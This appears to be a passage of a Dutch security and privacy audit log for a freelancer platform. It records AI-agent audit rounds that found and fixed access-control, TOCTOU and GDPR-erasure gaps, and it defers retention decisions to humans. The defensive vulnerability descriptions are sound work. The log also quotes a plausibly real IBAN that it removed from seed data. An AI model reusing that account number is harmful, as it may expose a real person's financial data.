  toekomstige suspend-PR zonder eigen enforcement zou stil een omzeilbare schorsing opleveren.
- **Geschonden regel:** OWASP A01 (Broken Access Control — ontbrekende afdwinging op een bestaand statusveld);
  CLAUDE.md tenant-isolatie / server-side waarheid (regel 1). CWE-noot: latente authorization-completeness.
- **Fix (deze PR):** fail-closed enforcement in de authorisatie-laag, spiegelt exact de bestaande
  `User.status`-poort. `currentActor()` (`src/lib/authz.ts`) leest nu `Tenant.status` live mee
  (`loadFreshUser` → `tenant: { select: { status } }`) en behandelt een lid van een niet-ACTIVE tenant als
  uitgelogd (`null`) via de nieuwe pure predikaat `tenantAccessBlocked(tenantId, tenantStatus)`. **Zero-live-impact:**
  geen enkele tenant staat op `SUSPENDED`, dus geen huidige gebruiker wordt geraakt; de poort activeert pas de dag
  dat een suspend-actie wordt gebouwd+gebruikt, en dan is fail-closed precies het gewenste gedrag. Geen suspend-UI
  gebouwd (dat is een feature, buiten scope) — alleen het bestaande veld wordt voortaan gehonoreerd. `tenantId == null`
  (directe platformgebruiker) → nooit geblokkeerd; `tenantId` gezet + status onbekend → fail-closed weigeren.
  +5 unit-tests (`authz.test.ts`, rood→groen): geschorste tenant blokkeert, ACTIVE laat door, geen-tenant ongemoeid,
  onbekende status fail-closed, elke niet-ACTIVE waarde (hoofdlettergevoelig) blokkeert.

## Ronde 2026-07-31 (basis: `main` @ 5cae5d33)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende hoog-risico
oppervlakken (naast de delta sinds de vorige ronde, `bdb502bf..5cae5d33`, #996–#1002 — grotendeels pure,
geteste logica: `credential-recommendations.ts`, `client-first-look.ts`, cascade-handlers, observability-
bundle — geen nieuw route-/mutatie-oppervlak). Gedekt: (1) BOLA/IDOR + path-traversal + token-timing +
foutlek op álle dynamische route-handlers die gevoelige resources serveren (media/documents/facturen/
prestaties/dossier/dba-dossier/modelovereenkomst/agenda-feed/avg-export/account-export); (2) cross-tenant
isolatie over de volledige franchise-server-action- en loader-set (+ `tenancy.ts`); (3) AVG-anonimisering/
erasure-volledigheid, exports (art. 15/20), dataminimalisatie/over-fetch, audit-dekking, k-anonimiteit.
Orchestrator-scans los: injectie (`$queryRaw` enkel `SELECT 1`, geen `dangerouslySetInnerHTML` behalve het
nonce'd theme-script), SSRF, CRON_SECRET-guards, CSP/HSTS/security-headers, PII-in-logs (mail-noop
prod-geredigeerd, M-3), betaal-webhook (rate-limit + body-cap + handtekening + idempotent + audit),
open-redirect (login hardcodeert `/dashboard`), CSV-formule-injectie (`csv.ts` `escapeCsvField`, CWE-1236).
OWASP A01/A03/A05/A07/A08 + AVG art. 5(1)(c)/(f)/9/15/17/20 als leidraad.

**Resultaat: geen nieuw KRITIEK/HOOG-toegangs- of injectiegat. Twee bevindingen deze ronde OPGELOST
(rood→groen); één eerder geëscaleerde HOOG blijft mensenwerk (bevestigd nog aanwezig).**

### OPGELOST — MIDDEL (TOCTOU, CWE-367, AVG art. 17): weesblob bij anonimisering-race op `anonymizeUser`

- **Repro (was):** `anonymizeUser` (`admin/gebruikers/actions.ts`) sneed de lijst met document-storagesleutels
  vóór de `$transaction` af (`prisma.document.findMany`), terwijl `document.deleteMany` pas een aantal DB-rondes
  later ín die transactie liep (na `requestMeta`, dispute-/audit-/credential-/invoice-lookups). Uploadt de nog-
  ACTIVE betrokkene een document (bv. VOG/diploma) in dat venster, dan verwijdert de `deleteMany` de rij (matcht
  `ownerId`), maar de storage-blob zat niet in de vóór-snapshot → een onvindbare weesblob met (mogelijk art. 9-)
  gevoelige documentinhoud overleeft de "verwijdering", zonder DB-verwijzing om 'm nog terug te vinden.
- **Geschonden regel:** AVG art. 17 (recht op verwijdering — onvolledige erasure) + CLAUDE.md regel 4/5
  (documenten privé via storage-abstractie; verwijderen wat telt). OWASP niet direct (geen toegangsgat); CWE-367.
- **Fix (deze PR):** de document-rij + blob-verwijdering verhuisd naar ná de transactie. Op dat punt is het account
  al `SUSPENDED`/`anonymizedAt` (`userAnonymizationData`) → `currentActor()` geeft `null` en de betrokkene kan niets
  meer uploaden; het read-then-delete is daardoor race-vrij (de dan-gelezen sleutels dekken exact de te wissen
  rijen). FK-veilig: `Credential → Document` is `onDelete: SetNull` en de eigen credentials worden ín de transactie
  verwijderd. Audit-`documentsDeleted` gevoed door een pre-transactie `document.count` (intentiegetal). Regressietest
  (`anonymize-erasure.test.ts`) bewijst rood→groen: de sleutel-`findMany` valt nu ná de `$transaction`
  (invocation-order) i.p.v. ervoor.

### OPGELOST — LAAG (CLAUDE.md regel 5 / verantwoordingsplicht): verwerkingsregister-export ongeaudit + inconsistente auth-foutafhandeling

- **Repro (was):** `/admin/avg/export` (verwerkingsregister + bewaartermijnen als CSV) schreef — anders dan élke
  andere export-route — géén auditregel bij de export, en riep `requireActor()` aan zonder de `try/catch`-
  `AuthorizationError`-afhandeling die de siblings wél hebben (een niet-ingelogde aanroep zou als propagerende 500
  eindigen i.p.v. een nette JSON-401). Geen personen-data (statisch organisatie-register), dus LAAG.
- **Geschonden regel:** CLAUDE.md regel 5 (audit alles wat telt) + consistente foutafhandeling. Geen toegangsgat
  (ADMIN-gepoort + middleware).
- **Fix (deze PR):** `AVG_REGISTER_EXPORTED`-auditregel toegevoegd (+ NL-label in `audit-labels.ts` voor de
  drift-gate) en de `try/catch`-`AuthorizationError`-poort gelijkgetrokken met de andere export-routes. Nieuwe
  route-test dekt ADMIN-export+audit, 403 voor niet-ADMIN, en de nette 401.

### BLIJFT MENSENWERK — HOOG (AVG art. 17/9): `NoShowReport.reason` / `Performance.rejectionReason` / `Invoice.rejectionReason` overleven `anonymizeUser`

- **Status:** herbevestigd nog aanwezig deze ronde. Deze door een dérde partij over de betrokkene geschreven
  vrije-tekstvelden (mogelijk art. 9-gezondheidsdata bij een no-show) worden bewust niet door de anonimisering
  geraakt — er kan een bewaargrond zijn bij een arbeids-/facturatiegeschil. Reeds meermaals geëscaleerd (zie de
  eerdere `NoShowReport.reason`-entries hieronder). **Per MENSENWERK.md §5 is dit een FG/mens-beslissing
  (redacteren-bij-anonimisering vs. gedocumenteerde retentiegrond) vóór er echte VOG/no-show-data live gaat — geen
  agent-fix.** Niet in deze PR opgelost; blijft geparkeerd.

## Ronde 2026-07-30b (basis: `main` @ bdb502bf)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op de delta sinds de vorige
ronde (`a5a038d2..bdb502bf`, #986–#995). Die delta was grotendeels design/merk-signatuur (uitrol 9–10/10,
`brand: Handslag + De Schakel`) plus drie functionele increments met nieuw data-/PII-oppervlak:
(1) **annuleringsbetrouwbaarheid-spiegel** voor de opdrachtgever (#994) — nieuwe reputatie-aggregatie
`client-reliability.ts`/`data/client-reliability.ts` getoond aan een ZZP'er op de opdracht-detailpagina én
als zelf-spiegel op `/samenwerkingen`; (2) **BTW-aangifte rubrieken­overzicht** (#993) + **kosten-per-categorie
op /uitgaven** (#990) — nieuwe financiële aggregaties (`administration/vat-declaration.ts`, `expense.ts`);
(3) **superseded-certificaat verloop-nudge-onderdrukking** (#991, `credentials.ts`). Oppervlakken gedekt:
object-/functie-niveau-autorisatie (IDOR/BOLA), cross-party/cross-tenant PII-lek, k-anonimiteit op
aggregaties, CSV-/formule-injectie op export-paden, credential-status-bypass, over-fetch, PII/secrets in
logs, foutlek. OWASP Top 10 (A01/A03/A08) + AVG art. 5(1)(c)/15/17/20 als leidraad. Stack gepatcht:
Next.js 15.5.21 (boven CVE-2025-29927), next-auth 5.0.0-beta.32, Prisma 6.19.3; `npm audit --omit=dev` = **0**.

**Alle drie functionele oppervlakken onafhankelijk schoon — geen nieuw KRITIEK/HOOG/MIDDEL security- of
privacy-gat. Eén LAAG defense-in-depth-hardening (privacy-render-poort) gevonden én OPGELOST (rood→groen).**

Geverifieerd schoon:

- **Annuleringsbetrouwbaarheid (#994)** — aggregate-only (`sampleSize/cancellations/lastMinute/cancelRate/tone`),
  geen individuele samenwerking/ZZP'er-identiteit lekt (`data/client-reliability.ts` selecteert enkel
  `status/cancelledAt/cancelledById/cancellationChargeable`, `MAX_COLLABORATIONS=50`, single-`companyId`-scope,
  `cancelledById` alleen intern voor de `byClient`-boolean). Authz: getoond **alleen aan een niet-eigenaar
  FREELANCER** (`showClientSignals = !isOwner && actor.role === "FREELANCER"`); owner/ADMIN/CLIENT/**FRANCHISER**
  krijgen `null`. De zelf-spiegel op `/samenwerkingen` is rol-gepoort (`CLIENT` → `getOwnReliabilityForClient(actor.id)`,
  self-scoped by construction). Sub-steekproef (`sampleSize < 3` ⇔ `tone === "unknown"`) toonde al enkel een
  neutrale "te weinig data"-tekst — geen ruw getal — pariteit met de audited-clean siblings payment-behavior/
  responsiveness (identieke `MIN_SAMPLE_SIZE = 3` + `tone === "unknown"`-poort).
- **BTW-aangifte + kosten-per-categorie (#993/#990)** — geen client-gestuurde identifier: alle aggregaties over
  `where: { ownerUserId | userId: actor.id }` (session-afgeleid, nooit uit query/params); `buildVatDeclaration`/
  `expenseCategoryShares` zijn **puur** over reeds-owner-scoped rijen. Geen IDOR. Geen nieuw export-pad; de bestaande
  BTW-CSV exporteert enkel numerieke `vatYear`-data (geen categorienaam/omschrijving → geen formule-injectie).
  React auto-escapet de gerenderde `description`. Bedragen server-side berekend (`sanitize()`, divide-by-zero-guard).
- **Superseded-certificaat (#991)** — `supersededVerifiedCredentialIds()` is een **pure classifier** over DB-rijen,
  géén status-mutator: raakt `CREDENTIAL_TRANSITIONS`/`assertTransition` niet en wordt uitsluitend gelezen om één
  verloop-**herinnering** te onderdrukken (`pending-tasks.ts`), nooit door `computeCompliance`/`matchScore`/trust-level.
  Een EXPIRED/superseded credential blijft overal waar het telt als verlopen — geen status-bypass. Onderdrukkingsregel
  conservatief (strikt `>` op expiry; de langstlevende geldige cert houdt altijd zijn eigen nudge) → hooguit over-notify,
  nooit under-notify.

### OPGELOST — LAAG (defense-in-depth, AVG art. 5(1)(c) k-anonimiteit): privacy-render-poort van de annuleringsbetrouwbaarheid had geen regressietest

- **Repro (was):** de opdrachtgever-facing UI (`client-reliability-block.tsx`) toont onder de steekproefgrens
  (`sampleSize < 3`) bewust GEEN ruw getal — anders lekt een ZZP'er één individuele annulering van een opdrachtgever
  onder k=3 (AVG art. 5(1)(c) dataminimalisatie). De correctheid daarvan hing volledig aan een geneste ternary die
  op `tone === "unknown"` sleutelde; er was **geen test** die dat borgde. Een refactor die de poort naar een ruw
  veld (bv. `cancelRate != null`) zou verleggen, of het `sampleSize`-getal uit de juiste branch zou halen, had de
  sub-k=3-lek stil kunnen herintroduceren met alle unit-tests nog groen. Geen live lek, wel een ongeborgde privacy-poort.
- **Geschonden regel:** AVG art. 5(1)(c) (dataminimalisatie/k-anonimiteit) — defense-in-depth; CLAUDE.md privacy-lat
  (geanonimiseerde weergaven waar het hoort). Geen access-control-gat (OWASP niet direct).
- **Fix (deze PR):** render-poort geëxtraheerd naar een pure `reliabilityDisplayMode(reliability)` in
  `client-reliability.ts` (`"insufficient" | "clean" | "stats"`) die uitsluitend op `tone` sleutelt; de component
  consumeert nu die mode i.p.v. ruwe velden. Vier nieuwe tests in `client-reliability.test.ts` — de sleuteltest geeft
  een bewust inconsistent sub-steekproefobject (`tone: "unknown"` mét `cancellations: 1, lastMinute: 1`) en asserteert
  `reliabilityDisplayMode` → `"insufficient"` (rood→groen: een poort die op ruwe getallen sleutelt zou hier `"stats"`
  teruggeven en de individuele annulering lekken). `npm run typecheck`/`lint`/`test` (5406) /`build`/`prettier` groen.

## Ronde 2026-07-30 (basis: `main` @ a5a038d2)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken.
Delta sinds de vorige ronde (`08708e99..a5a038d2`, #972–#985) was grotendeels design/ontwerp-signatuur
(concepts 521–530, token-uitrol 1–10) plus enkele functionele wijzigingen: nieuwe routing-provider
(Geoapify) server-side fetch + connectiviteitszelftest (`routing.ts`, `routing-selftest.ts`), snelle
beschikbaarheidsstatus-toggle (nieuwe ZZP-mutatie `setAvailabilityStatus`), `rateCents`-bovengrens in
`assertPerformanceWithinLimits`, en de routing-zelftest-rate-limiter. Oppervlakken gedekt:
(1) alle `src/app/api/**/route.ts`-handlers (IDOR/BOLA, path-traversal, cron-auth, publieke sessieloze
routes, SSRF, foutlek); (2) cross-tenant/franchiser-isolatie + CSV-/formule-injectie over alle
export-paden; (3) AVG betrokkenen-rechten (art. 17 anonimisering-volledigheid, art. 15/20 export-
volledigheid, PII/secrets in logs). OWASP Top 10 (A01 broken access control, A03 injection, A08 integrity,
A10 SSRF) + AVG art. 5/15/17/20/32 als leidraad.

**1 bevinding gevonden + gefixt (MIDDEL, AVG art. 15/20); 1 bekende HOOG (art. 17) blijft geparkeerd
voor een menselijke/FG-beslissing; overige oppervlakken schoon.**

Nieuwe/gewijzigde mutatie- en fetch-oppervlakken geverifieerd schoon:

- **`setAvailabilityStatus` (nieuwe ZZP-mutatie)** — volgt de volledige keten auth → `requireRole("FREELANCER")`
  → Zod (`availabilityStatusSchema`, weigert UNKNOWN/onbekend) → **compound-guarded** owner-scoped write
  (`updateMany where {id, userId}`) → `audit(AVAILABILITY_STATUS_CHANGED)`. Geen IDOR/TOCTOU/mass-assignment.
- **Routing-provider (Geoapify) server-side fetch** — géén SSRF: de host is hard vastgezet (`new URL(...)`
  - `searchParams.set`, correct ge-escaped), geen user-gestuurde host/URL. Default UIT (`offline`). Enige
    naar de provider verzonden PII is `profile.location`/`job.location` (plaatsnaam, geen volledig adres) —
    geminimaliseerd. De API-sleutel lekt nooit: `RoutingConnectivityError` draagt bewust een veilig bericht
    (provider + reden/HTTP-status, nooit de URL met de sleutel); `routingDiagnostics` geeft alleen een
    boolean `keyConfigured`. Zelftest is READ-ONLY (geen cache-write, geen route-berekening).
- **API-route-handlers** — alle ID-geparametriseerde routes (`documents/[id]`, `samenwerkingen/[id]/*`,
  `facturen|prestaties|admin/facturatie/[id]/pdf`) fetchen-dan-checken ownership/rol, geven 404 i.p.v. 403
  (geen bestaans-oracle, CWE-203) en auditen zowel geweigerde als geslaagde toegang. `media/[...key]`:
  dubbele laag (DB-lookup op `logoKey` + `baseDir`-containment) tegen path-traversal. Alle `tasks/*` +
  `backups/heartbeat` fail-closed zonder `CRON_SECRET`, `timingSafeEqual` op een Bearer-header (geen
  query-param). `push/subscribe` heeft een anti-SSRF host-allowlist.
- **Cross-tenant/franchiser** — elke FRANCHISER-bereikbare query gaat via `ownsViaTenant`/`tenantScopeWhere`/
  `assertSameTenant` vóór mutatie/teruggave; zelfs secundaire lek-vectoren (job-titel via double-booking-hint)
  zijn onderdrukt. Geen cross-tenant-lek gevonden.
- **CSV-/formule-injectie** — elk export-pad routeert user-tekst door `escapeCsvField`/`toCsv` (CWE-1236,
  prefixt `=+@-\t\r`); geen hand-rolled `join(",")` op ongeëscapete cellen. `npm audit --omit=dev` = **0
  productie-kwetsbaarheden**. Next.js 15.5.21 (boven CVE-2025-29927 middleware-bypass).
- **PII/secrets in logs** — `logger.ts` redact recursief PII-keys + maskeert e-mailadressen; call-sites schoon.

### OPGELOST — MIDDEL (AVG art. 15/20 onvolledige inzage): eigen bevestigde identiteit ontbrak in de data-export

- **Repro (was):** `buildAccountExport()` (`src/lib/account-export.ts`) selecteerde op `User` alleen
  `{id, email, name, role, status, createdAt, deletionRequestedAt}` en liet `User.verifiedLegalName` (de door
  iDIN/eIDAS **bevestigde juridische naam** van de betrokkene) én `User.identityVerifiedAt` (het
  verificatiemoment) weg. Dat zijn onmiskenbaar eigen persoonsgegevens van de betrokkene — ze worden actief
  verzameld en gebruikt voor vertrouwensscoring (`signals.ts`, `suggestions.ts`, `admin-user-detail.ts`) —
  en horen dus in de art.15/20-inzage/portabiliteits-export. Ze ontbraken, dus een gebruiker die zijn eigen
  data opvroeg kreeg zijn bevestigde juridische identiteit niet mee.
- **Geschonden regel:** AVG art. 15 (recht op inzage) / art. 20 (dataportabiliteit); CLAUDE.md privacy-lat
  (betrokkenen-rechten volledig). Geen access-control-gat (OWASP niet direct).
- **Fix (deze PR):** `identityVerifiedAt: true, verifiedLegalName: true` toegevoegd aan de `user`-select in
  `buildAccountExport` (+ comment die het als art.15/20-eigen-PII motiveert). Nieuwe test in
  `account-export.test.ts`: asserteert dat de `user`-select beide velden bevat (rood→groen — zonder de fix
  is `select.verifiedLegalName === undefined` en faalt `toBe(true)`; geverifieerd via `git stash`). Anonimisering
  (art. 17) van deze velden was al gedekt: `verifiedLegalName`/`identityVerifiedAt` worden in `anonymizeUser`
  gewist (naam-overschrijving + identiteitsreset).

### GEPARKEERD — HOOG (AVG art. 17): vrije tekst van derden ÓVER de betrokkene overleeft `anonymizeUser` (herbevestigd, ongewijzigd)

- **Repro:** `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) wist grondig alle vrije tekst
  die de betrokkene zélf schreef (~20 redactie-ops), maar raakt bewust niet de vrije tekst die een **tegenpartij
  óver** de betrokkene schreef: `Review.comment` waar `subjectId === userId` (ontvangen beoordelingen; alleen
  `authorId === userId` wordt genulld), `NoShowReport.reason` (reden van de melder over de gemelde ZZP'er), en
  `ShiftHandoff.decisionNote`/`reason` van de tegenpartij. Zo'n comment kan de echte naam + gedrags-/gezondheids-
  adjacente detail bevatten en blijft na een verwijderverzoek onbeperkt zichtbaar voor een ADMIN.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid). **Waarom geparkeerd i.p.v. gefixt:** de keuze
  tussen (a) ook de "over-mij"-kant redacteren en (b) bewaren als rechtmatig bewijs bij een lopend arbeids-/
  betaalgeschil is een **juridische grondslag-afweging** — precies het type beslissing dat het AUTO-MODE-
  contract en MENSENWERK.md §5 aan een mens/FG voorbehouden. Een agent mag deze bewaartermijn niet eenzijdig
  vaststellen. **Aanbevolen:** menselijke/FG-beslissing vastleggen (tijd-/geschil-gescopete uitzondering
  i.p.v. onvoorwaardelijke bewaring) vóór echte VOG-/diploma-houders live gaan. Blijft bovenaan de backlog
  tot die beslissing er is.

## Ronde 2026-07-29 (basis: `main` @ 08708e99)

Audit: orchestrator (Opus 4.8) + 2 parallelle adversariële Opus-audits, gericht op de delta sinds de
vorige ronde (`a10cba04..08708e99`, #958–#971): nieuw `iban`-veld (SEPA-betaalrekening) + `website`-veld
op `FreelancerProfile`, cascade-overdue betaal-signaal, KOR-projectie, aangifte-TOCTOU/rollback,
performance-ORT-bovengrens, retentie-backlog-gauges. Oppervlakken: (1) object-/functie-niveau-autorisatie,
IDOR/BOLA, TOCTOU, mass-assignment over de gewijzigde mutatie-oppervlakken (`ontzorgd/aangifte/actions.ts`,
`cascade/performance-commands.ts`, `signals.ts`, `pending-tasks.ts`, `aanmaning.ts` IBAN-flow); (2) AVG
betrokkenen-rechten op de nieuwe PII-velden (`iban`/`website`): anonimisering (art. 17), over-fetch naar
client, cross-party/cross-tenant-lek, XSS via `website`-link, secrets/PII in logs/metrics, seed-data.

**2 bevindingen gevonden + gefixt (1 HOOG, 1 MIDDEL); mutatie-oppervlak verder schoon.**

### OPGELOST — HOOG (AVG art. 17 onvolledige verwijdering): `iban` overleefde account-anonimisering

- **Repro (was):** #970 voegde een `iban`-kolom (SEPA-bankrekeningnummer — direct identificerend financieel
  persoonsgegeven van een natuurlijke persoon) toe aan `FreelancerProfile`, maar werkte
  `freelancerProfileAnonymizationData()` in `src/lib/account-anonymization.ts` NIET bij. Die functie wist wél
  `hourlyRate`/`btwNumber`/`website`/`monthlyIncomeGoalCents`/`defaultMotivation`, maar niet `iban`. Gevolg: na
  een door de gebruiker aangevraagde verwijdering (admin `anonymizeUser`, die dit object wholesale in
  `freelancerProfile.updateMany({data})` spreidt) bleef de betaalrekening onbeperkt op de rij staan — een
  onvolledige art.17-verwijdering. De bestaande anonimiseringstestsuite dekte alle andere velden expliciet af,
  maar had geen `iban`-assertie, dus geen enkele test ving het gat.
- **Geschonden regel:** AVG art. 17 (recht op vergetelheid), CLAUDE.md privacy-lat (volledige anonimisering
  incl. documenten/PII); OWASP niet direct (privacy-, geen access-control-gat).
- **Fix (deze PR):** `iban: null` toegevoegd aan zowel het return-type als het object van
  `freelancerProfileAnonymizationData()` + comment die het als art.17-financieel-PII motiveert.
  `account-anonymization.test.ts`: nieuwe assertie `expect(data.iban).toBeNull()` (rood→groen: zonder het veld
  is `data.iban === undefined` en faalt `toBeNull()`). Data-export (art. 15/20) was al dekkend: de export-builder
  gebruikt `include` op `freelancerProfile`, dus `iban` zit automatisch in de eigen-gegevens-export.

### OPGELOST — MIDDEL (AVG art. 5/32, PII in git): mogelijk echte Rabobank-IBAN in seed-data

- **Repro (was):** `prisma/seed.ts` gaf de demo-ZZP'er "Youssef Bakker" `iban: "NL39RABO0300065264"` — een
  mod-97-geldig, plausibel-echt Rabobank-rekeningnummer, statisch niet te onderscheiden van een echt account.
  Zo'n waarde permanent in de git-historie is een onnodig art.5/32-risico (in tegenstelling tot de sibling
  `NL91ABNA0417164300`, het universele Wikipedia-voorbeeld-IBAN, dat ondubbelzinnig veilig is).
- **Geschonden regel:** CLAUDE.md regel "geen PII/secret in git"; AVG art. 5 (minimalisatie) / art. 32 (beveiliging).
- **Fix (deze PR):** vervangen door `NL44RABO0123456789` — mod-97-geldig én ondubbelzinnig synthetisch
  (sequentiële cijfers `0123456789`, een breed-gedocumenteerd Rabobank-voorbeeld-IBAN). Menselijke bevestiging
  gevraagd (MENSENWERK): `prisma db seed` mag nooit tegen een productie-/gedeelde DB draaien (Dockerfile seedt
  niet automatisch bij boot — operationeel bevestigen).

`npm audit --omit=dev` = **0 productie-kwetsbaarheden** (ongewijzigd t.o.v. vorige ronde). Next.js 15.5.21
(boven CVE-2025-29927 middleware-bypass).

## Ronde 2026-07-28b (basis: `main` @ a10cba04)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken, plus
eigen orchestrator-probes op de delta sinds de vorige ronde (`4017c336..a10cba04`, #951–#957: availability-
vensters CRUD, verificatie-doorlooptijd-indicatie, collaboration-credential-expiry, `/api/metrics`-audit-
retentie-gauge, `dispute-commands` TOCTOU/rol-grendel, publiek `profile-screen`). Oppervlakken:
(1) **object-/functie-niveau-autorisatie, IDOR/BOLA, cross-tenant-isolatie, mass-assignment, TOCTOU** over ALLE
51 `src/app/**/actions.ts` + `src/lib/actions/*` + alle ID-geparametriseerde `src/app/api/**`-route-handlers
(documents/[id], media/[...key], facturen/prestaties/facturatie PDF, samenwerkingen/[id]/{dossier,dba-dossier,
modelovereenkomst}, agenda, account/export, admin/export) + `authz.ts`/`tenancy.ts`/`route-guards.ts`/
`middleware.ts` + de volledige `cascade/*-commands.ts`-laag; (2) **injectie/upload/SSRF/secrets/XSS/CSV-formule/
ICS-injectie/foutlek/open-redirect/headers/webhook-signature** (statisch grep + lees) over `$queryRaw`-sites,
`dangerouslySetInnerHTML`, alle CSV-/ICS-exportbouwers (`lib/csv.ts`, `lib/calendar/ics.ts`), server-side
`fetch()`-sinks (billing/verify/rate-limit), `abonnement`/`media`-redirects en `billing/webhook`; (3) **AVG
betrokkenen-rechten**: `anonymizeUser` veld-voor-veld tegen de ACTUELE `schema.prisma` (schema-drift), PII-over-
fetch op kandidaten-/roster-/reacties-paden, document-toegang-audit, k-anonimiteit (markttarief ≥10,
doorlooptijd ≥8), PII-in-logs, retentie-crons vs. verwerkingsregister, doorgifte derden.

**Alle drie oppervlakken onafhankelijk schoon — geen nieuw KRITIEK/HOOG/MIDDEL/LAAG security- of privacy-gat.**
Geverifieerd: de #957-`resolveDispute`- en #954-`openDispute`-fixes gebruiken compound-guarded `updateMany`
bínnen `$transaction` (TOCTOU-dicht); de nieuwe availability-CRUD (`beschikbaarheid/actions.ts`) volgt de
volle keten auth→rol→ownership(compound-guarded `updateMany`)→Zod→actie→audit; `verification-turnaround.ts`
is een platform-breed niet-identificerend aggregaat achter k≥8; de `profile-screen`-`select` is
data-geminimaliseerd (geen `note`/financiële velden op de deels-publieke `/zzp/[id]`-route); `/api/metrics`'
nieuwe `zzp_audit_retention_backlog`-gauge is PII-vrij achter de `authorizeCron`-Bearer-guard. `$queryRaw` overal
alleen parameterloze `SELECT 1`-tagged-templates (geen `$queryRawUnsafe`, geen concatenatie); CSV-cellen
formule-geneutraliseerd (`= + @ \t \r` + niet-numerieke `-`); ICS-tekst ge-escaped; alle `fetch()`-sinks naar
vaste/ENV-provider-URLs (geen SSRF); beide redirects naar server-vertrouwde waarden (provider-checkout-URL,
presigned S3-URL); `billing/webhook` verifieert Stripe-HMAC + `ProcessedWebhookEvent`-replay-grendel, Mollie
re-fetcht autoritatief. `anonymizeUser` dekt elk PII-dragend veld/model (incl. document-/credential-blob-cleanup,
drie-kopie dispuut-/credit-reden); geen drift t.o.v. het huidige schema.

De reeds bekende, voor een menselijke FG-/juridische beslissing geparkeerde items blijven staan en mag een agent
NIET unilateraal "oplossen": `Job.title`/`Job.description`-anonimisering (LAAG, retentie-/grondslag-afweging),
de k-drempel-inconsistentie voor reputatiesignalen (`client-reliability`/`client-responsiveness`/
`collaboration-quality`, MIN_SAMPLE=3 vs. platformnorm k≥10 — HOOG, FG-afweging), document-/blob-retentie voor
EXPIRED/REJECTED-credentials en `Message`-retentie >12mnd (geplande increments), en derde-partij-vrije-tekst-
retentie (`NoShowReport.reason`/`Performance.rejectionReason`/`Lead(Contact)`). Zie MENSENWERK.md §5.

`npm audit --omit=dev` = **0 productie-kwetsbaarheden**. Next.js 15.5.21 (boven CVE-2025-29927 middleware-bypass).

## Ronde 2026-07-28 (basis: `main` @ 4017c336)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken:
(1) object-/functie-niveau-autorisatie, IDOR/BOLA, cross-tenant-isolatie, mass-assignment & audit-dekking over
alle `franchise/**`, `samenwerkingen/**` en `admin/**` server-actions + `authz.ts`/`tenancy.ts`/`middleware.ts`
(inclusief de gedelegeerde `cascade/*-commands.ts`-ownership-helpers); (2) injectie/upload/SSRF/secrets/XSS/
CSV-formule/foutlek/open-redirect/headers/webhook-signature over álle `src/app/api/**`-route-handlers +
`storage.ts` + `middleware.ts`/`next.config` + CSV-/ICS-builders; (3) AVG betrokkenen-rechten (`anonymizeUser`
vs. actuele schema, PII-over-fetch naar client op kandidaten-/roster-/reacties-paden, audit-logging,
k-anonimiteit, PII-in-logs, doorgifte-register art. 30, retentie). Delta sinds vorige ronde (#944–#950) apart
gelezen: `client-stats.ts`' nieuwe `oldestUnreviewedApplicationAt` is `job:{companyId}`-gescoopt en exposeert
alleen een `Date` (geen kandidaat-PII); de `/api/metrics`-gauge `zzp_invoices_overdue_unflipped` is PII-vrij
achter de cron-guard; `payment-obligations.summarizeDueThisWeek` is pure berekening; register-edits doc-only.
`npm audit --omit=dev` = **0 productie-kwetsbaarheden**. Next.js 15.5.21 (boven CVE-2025-29927-middleware-bypass).

**Alle drie oppervlakken onafhankelijk schoon — geen nieuw KRITIEK/HOOG/MIDDEL security- of privacy-gat.**
De 5 AVG-bevindingen van audit (3) zijn allemaal **reeds bekend en geparkeerd voor een menselijke FG-/juridische
beslissing** (MENSENWERK.md §5; zie de geparkeerde items verderop) — geen daarvan mag een agent unilateraal
"oplossen" (item 1 = het wissen van door de tegenpartij geschreven, bewijskrachtige vrije tekst). Auth-/reset-
oppervlak geverifieerd: reset-poisoning-beschermd (`publicOrigin`, niet de Host-header), enumeratie-beschermd,
rate-limited, gehasht single-use-token met atomaire claim.

### OPGELOST — LAAG (defense-in-depth, BFLA/OWASP A01 regressie-net): `resolveDispute` rol-grendel had geen negatieve test

- **Repro (was):** de `samenwerkingen/[id]`-actie-wrappers roepen alleen `requireActor()` (auth) aan en delegeren
  ownership/rol volledig aan de `cascade/*-commands.ts`-laag. `anti-oracle-party.test.ts` dekt de niet-partij-
  weigering van álle partij-commando's (approve/reject/submit/update/credit/confirm/sign/openDispute) — behalve
  `resolveDispute`, het ENIGE platform-privilege (ontdooit de bevroren cascade, buiten de mediatie om, alleen ADMIN).
  Beide bestanden die `resolveDispute` noemen gebruikten hem enkel in een happy-path/noop-mock; geen enkele test
  borgde de `actor.role !== "ADMIN"`-grendel. Een toekomstige refactor die die regel laat vallen zou elke partij
  (of willekeurige gebruiker) zijn eigen dispuut laten opheffen en de geld-/statuscascade laten hervatten — een
  functie-niveau-privilege-escalatie (CWE-269/CWE-863) die niets zou vangen.
- **Geschonden regel:** CLAUDE.md architectuurregel 2 (auth→rol→ownership→…→audit op elke mutatie), OWASP A01
  (Broken Access Control / BFLA).
- **Fix (PR #—):** `src/lib/cascade/resolve-dispute-authz.test.ts` — 6 cases die borgen dat een CLIENT/FREELANCER
  (partij) én een vreemde de platform-rolmelding krijgen, dat de grendel **vóór** elke DB-lees én -mutatie
  kortsluit (geen existentie-oracle, geen effect), en dat een ADMIN de grendel wél passeert (rol-, niet partij-
  gebaseerd). Bewezen rood→groen: met de grendel verwijderd falen 4/6, met de grendel 6/6 groen.

## Ronde 2026-07-27b (basis: `main` @ 756e6952)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken over
de sinds `8c7f471a` verse commits (#937–#943): (1) object-/functie-niveau-autorisatie, IDOR/BOLA, TOCTOU,
cross-tenant-isolatie & anti-oracle op de gewijzigde mutatie-oppervlakken (`certificaten/actions.ts`
DUO/BIG-TOCTOU, `kandidaten/actions.ts` + `opdrachten/actions.ts` anti-oracle, `dispute-commands.ts`
openDispute-statusrem, de cascade-command-laag, `authz.ts`/`tenancy.ts`/`middleware.ts`); (2) injectie/upload/
